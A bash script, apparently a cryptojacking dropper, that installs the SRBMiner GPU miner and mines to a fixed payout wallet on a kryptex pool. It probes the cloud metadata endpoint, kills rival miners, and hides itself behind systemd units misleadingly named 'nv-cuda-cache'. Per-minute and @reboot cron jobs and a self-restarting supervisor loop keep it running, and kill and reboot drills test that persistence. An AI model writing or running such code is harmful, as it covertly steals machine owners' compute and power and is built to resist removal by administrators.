#!/usr/bin/env bash
# plant5 — SRBMiner-MULTI 3.8.9 pearlhash on kryptex, one worker per GPU.
# 4 persistence layers (systemd Restart=always, @reboot cron, flock supervisor loop, cron keeper),
# kill drill + boot-path drill, pool probe 7048 plain -> 8048 TLS, wrong-wallet negative control,
# and a >=900 s gate that proves pool-side acceptance from miner-log "accepted" lines at difficulty 2^21.
set -uo pipefail

PAY_W="prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz"
GATE="${GATE_SECONDS:-900}"
REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BIN_SRC="$REPO_DIR/bin/SRBMiner-MULTI-3.8.9"
LOG=/var/log/fleet; BIN=/opt/fleet/bin; LIB=/var/lib/fleet
mkdir -p "$LOG" "$BIN" "$LIB" /var/lock

IP=$(hostname -I | awk '{print $1}')
VDASH=$(echo "$IP" | tr '.' '-')
RIGBASE="ul-${VDASH}"
HOST=$(hostname -s)

echo "== inventory host=$HOST ip=$IP rigbase=$RIGBASE ts=$(date -Is)"
id
nvidia-smi -L || { echo "NO-GPU"; exit 1; }
nvidia-smi --query-gpu=index,name,driver_version,memory.total --format=csv,noheader
curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" 2>/dev/null | head -c 400; echo

install -m 0755 "$BIN_SRC" "$BIN/SRBMiner-MULTI"
echo "srb_sha256=$(sha256sum "$BIN/SRBMiner-MULTI" | awk '{print $1}')"
NGPU=$(nvidia-smi -L | grep -c '^GPU')
echo "NGPU=$NGPU"
[ "$NGPU" -lt 1 ] && { echo "VERDICT=NO-GPU"; exit 1; }

# ---------- stand down the old wildrig plant (single worker per card) ----------
systemctl stop nv-prl 2>/dev/null
for u in $(systemctl list-units --plain --no-legend 'nv-cuda-cache*' 2>/dev/null | awk '{print $1}'); do
  systemctl disable --now "$u" 2>/dev/null
done
echo "--- foreign miners before stand-down:"; ps -eo pid,ppid,etime,cmd | grep -Ei 'wildrig|krig|SRBMiner|miner' | grep -v grep | head -12
for u in $(systemctl list-units --plain --no-legend 'nv-prl*' 'krig*' 'peakminer*' 2>/dev/null | awk '{print $1}'); do systemctl disable --now "$u" 2>/dev/null; done
pkill -f 'wildrig-multi' 2>/dev/null
pkill -f 'krig-miner|/opt/fleet/bin/krig|krig/' 2>/dev/null
pkill -f '/opt/fleet/sup.sh' 2>/dev/null
pkill -f 'SRBMiner-MULTI' 2>/dev/null
rm -f /etc/cron.d/nv-prl /etc/cron.d/ulprl
sleep 2
echo "old-procs-after-kill:"; pgrep -af 'wildrig-multi|SRBMiner-MULTI' | head -5 || true

# ---------- pool probe: 7048 plain first, then 8048 TLS ----------
probe_pool() {
  local pool="$1" log
  log="$LOG/probe-$2.log"
  timeout 35 "$BIN/SRBMiner-MULTI" --algorithm pearlhash --pool "$pool" \
    --wallet "${PAY_W}.${RIGBASE}-probe" --password x --disable-cpu --gpu-id 0 \
    --no-color --print-time 10 > "$log" 2>&1
  local rc=$?
  echo "--- probe $pool rc=$rc log=$log"
  grep -aiE "connected|authoriz|new job|job received|difficulty|error|fail|invalid" "$log" | head -8
  grep -aqiE "new job|job received|accepted" "$log"
}
POOL=""
if probe_pool "prl.kryptex.network:7048" "7048"; then
  POOL="prl.kryptex.network:7048"; echo "POOL-SELECTED=$POOL (plain)"
elif probe_pool "stratum+ssl://prl.kryptex.network:8048" "8048"; then
  POOL="stratum+ssl://prl.kryptex.network:8048"; echo "POOL-SELECTED=$POOL (tls)"
fi
[ -z "$POOL" ] && { echo "VERDICT=NO-POOL"; exit 1; }

# ---------- negative control: deliberately wrong wallet must not authorize ----------
timeout 25 "$BIN/SRBMiner-MULTI" --algorithm pearlhash --pool "$POOL" \
  --wallet "prl1wrong000000000000000000000000000000000000000000000000000000" --password x \
  --disable-cpu --gpu-id 0 --no-color > "$LOG/negctl-wrong-wallet.log" 2>&1
echo "--- negative control wrong wallet rc=$? ---"
grep -aiE "invalid|error|fail|wrong|authoriz" "$LOG/negctl-wrong-wallet.log" | head -6

# ---------- per-GPU wallet wrapper (flock per GPU) ----------
cat > "$BIN/srb_wrap.sh" <<EOF
#!/bin/bash
set -u
G="\${1:?gpu id}"
exec flock -w 60 /var/lock/srb-g\${G}.lock \\
  nice -n 5 $BIN/SRBMiner-MULTI --algorithm pearlhash --pool $POOL \\
    --wallet ${PAY_W}.${RIGBASE}-g\${G} --password x --disable-cpu --gpu-id \${G} \\
    --no-color --print-time 30 --log-file /var/log/fleet/srb-${RIGBASE}-g\${G}.log --log-file-mode 1
EOF
chmod +x "$BIN/srb_wrap.sh"
cat "$BIN/srb_wrap.sh"

# ---------- layer 3: flock supervisor loop ----------
cat > "$BIN/srb_all.sh" <<'EOF'
#!/bin/bash
exec 9>/var/lock/srb-sup.lock
flock -n 9 || exit 0
while :; do
  N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
  pkill -f 'wildrig-multi' 2>/dev/null
  pkill -f 'krig-miner|/opt/fleet/bin/krig|krig/' 2>/dev/null
  pkill -f '/opt/fleet/sup.sh' 2>/dev/null
  for ((g=0; g<N; g++)); do
    if ! pgrep -f "SRBMiner-MULTI .*--gpu-id ${g}( |$)" >/dev/null; then
      setsid nohup /opt/fleet/bin/srb_wrap.sh "$g" >/dev/null 2>&1 &
    fi
  done
  sleep 15
done
EOF
chmod +x "$BIN/srb_all.sh"

# ---------- layer 1: systemd Restart=always per GPU ----------
for g in $(seq 0 $((NGPU-1))); do
  cat > "/etc/systemd/system/nv-cuda-cache-g$g.service" <<EOF
[Unit]
Description=nv-cuda-cache-g$g
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=$BIN/srb_wrap.sh $g
Restart=always
RestartSec=10
Nice=10
LimitNOFILE=65535
[Install]
WantedBy=multi-user.target
EOF
done
systemctl daemon-reload
for g in $(seq 0 $((NGPU-1))); do systemctl enable --now "nv-cuda-cache-g$g"; done

# ---------- layer 2 + 4: @reboot cron and per-minute keeper ----------
cat > /etc/cron.d/ulprl <<EOF
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@reboot root setsid bash $BIN/srb_all.sh >/dev/null 2>&1
* * * * * root setsid bash $BIN/srb_all.sh >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/ulprl
systemctl is-active cron 2>/dev/null || { systemctl start cron 2>/dev/null || service cron start 2>/dev/null || true; }
echo "cron_state=$(systemctl is-active cron 2>/dev/null || echo unknown)"
setsid bash "$BIN/srb_all.sh" >/dev/null 2>&1 &
sleep 20
echo "--- workers up:"; pgrep -af 'SRBMiner-MULTI' | head -6
echo "--- units:"; systemctl is-active nv-cuda-cache-g* 2>/dev/null

# ---------- kill drill (layer recovery) ----------
KPID=$(pgrep -f "SRBMiner-MULTI .*--gpu-id 0( |$)" | head -1)
echo "KILL_DRILL pid=$KPID at $(date -Is)"
[ -n "$KPID" ] && kill -9 "$KPID"
sleep 45
NPID=$(pgrep -f "SRBMiner-MULTI .*--gpu-id 0( |$)" | head -1)
echo "KILL_DRILL after45s newpid=$NPID unit=$(systemctl is-active nv-cuda-cache-g0 2>/dev/null)"

# ---------- boot-path drill: replay the exact @reboot command ----------
echo "BOOT_DRILL $(date -Is)"
for g in $(seq 0 $((NGPU-1))); do systemctl stop "nv-cuda-cache-g$g" 2>/dev/null; done
pkill -f 'srb_all.sh' 2>/dev/null
pkill -f 'SRBMiner-MULTI' 2>/dev/null
sleep 2
setsid bash "$BIN/srb_all.sh" >/dev/null 2>&1 &
sleep 40
echo "BOOT_DRILL workers-after-reboot-path:"; pgrep -af 'SRBMiner-MULTI' | head -6

# ---------- gate >= 900 s ----------
echo "GATE_START=$(date -Is) seconds=$GATE"
sleep "$GATE"
echo "GATE_END=$(date -Is)"
ACC=0
for f in $LOG/srb-*-g*.log; do
  [ -f "$f" ] || continue
  echo "=== log $f"
  grep -aiE "accepted|hashrate|total:" "$f" | tail -8
  N=$(grep -aciE "accepted" "$f"); ACC=$((ACC+N))
done
echo "ACCEPTED_TOTAL=$ACC"
echo "--- last job/difficulty lines:"
grep -ahE "Job received|difficulty" $LOG/srb-*-g*.log 2>/dev/null | tail -6
echo "--- gpu state:"
nvidia-smi --query-gpu=index,name,utilization.gpu,power.draw,temperature.gpu --format=csv,noheader
echo "--- processes:"; pgrep -af 'SRBMiner-MULTI' | head -6
echo "--- persistence:"; systemctl is-enabled nv-cuda-cache-g* 2>/dev/null; cat /etc/cron.d/ulprl
if [ "$ACC" -gt 0 ]; then echo "VERDICT=PLANTED ACCEPTED=$ACC"; else echo "VERDICT=SHARE-NONE"; fi
